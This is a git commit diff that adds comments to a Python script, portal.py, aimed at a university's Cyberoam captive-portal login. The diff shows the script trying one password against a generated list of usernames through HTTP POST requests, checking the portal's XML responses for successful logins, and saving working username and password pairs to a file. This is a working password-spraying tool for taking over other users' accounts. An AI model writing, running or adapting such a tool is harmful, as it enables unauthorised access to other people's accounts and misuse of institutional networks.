bc4f306347bbfe483563ec9b18addbcdcbbf07f8
Deepanshu Rana <deepanshurana4500@gmail.com>
2019-10-07 11:18:44 +0530

    Updated comments

--- portal.py
+++ portal.py
@@ -9,34 +9,46 @@ for x in range(initial,terminal):
 	file.write(str(initial))
 	file.write("\n")
         initial += 1
+	
 file.close()
+# Cyberoam url for our university.
 url = 'http://172.16.73.12:8090/httpclient.html'
 username=[]
 
 with open("username.txt") as f:
-    username = f.readlines()
+    username = f.readlines() # reads all the line until EOF. 
 
 password=''
 password = raw_input("Enter Password: ")
 print("Searching ...")
 add=open("working.txt","a") 
  
- 
+# XML Responses for different cases
 success = "<?xml version='1.0' ?><requestresponse><status><![CDATA[LIVE]]></status><message><![CDATA[You have successfully logged in]]></message><logoutmessage><![CDATA[You have successfully logged off]]></logoutmessage><state><![CDATA[]]></state></requestresponse> \n" 
 
 dataexceed="<?xml version='1.0' ?><requestresponse><status><![CDATA[LOGIN]]></status><message><![CDATA[Your data transfer has been exceeded, Please contact the administrator]]></message><logoutmessage><![CDATA[You have successfully logged off]]></logoutmessage><state><![CDATA[]]></state></requestresponse> \n"
 
 maxlogin="<?xml version='1.0' ?><requestresponse><status><![CDATA[LOGIN]]></status><message><![CDATA[You have reached Maximum Login Limit.]]></message><logoutmessage><![CDATA[You have successfully logged off]]></logoutmessage><state><![CDATA[]]></state></requestresponse>\n"
-count = 0     
+
+count = 0     # initiating count 
+
+"""
+
+-------------------------------------This is the main for loop, 
+
+
+"""
+
+
 for i in username :
-	i = i.replace("\n","")      
+	i = i.replace("\n","")      # replaces '\n' with ' '
 	values = {
 	'mode':'191',
 	'username':i,
 	'password':password	
 		  }
 	r = requests.post(url, data=values)
-	k = r.content
+	k = r.content    # for viewing the payload information.
 	if(k == success):
 		
 		print i,":Can Be Login"
@@ -53,6 +65,7 @@ for i in username :
 		add.write(password)
 		add.write("\n")		
 		count+=1
+		
 	if(k == maxlogin):
 		
 		print i,":Max Login Limit Reached"
